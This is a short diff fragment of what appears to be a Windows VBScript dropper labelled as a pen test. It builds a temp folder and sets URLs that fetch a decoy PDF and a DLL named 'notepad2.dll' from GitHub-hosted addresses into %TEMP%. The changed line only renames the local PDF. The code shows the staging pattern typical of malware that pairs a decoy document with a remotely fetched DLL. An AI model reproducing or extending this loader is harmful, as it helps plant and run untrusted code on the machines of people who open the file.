@@ -21,7 +21,7 @@
         tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
         targetDir = tempDir & "\MyPenTest"
         pdfUrl = "https://gnm7856.github.io/tomr/sample.pdf"
-        pdfLocal = targetDir & "\dummy.pdf"
+        pdfLocal = targetDir & "\sample.pdf"
         dllUrl = "https://raw.githubusercontent.com/bhekinko/test/main/notepad2.dll"
         dllPath = tempDir & "\notepad2.dll"        
         objShell.Run "cmd.exe /c mkdir """ & targetDir & """ >nul 2>&1", 0, True      
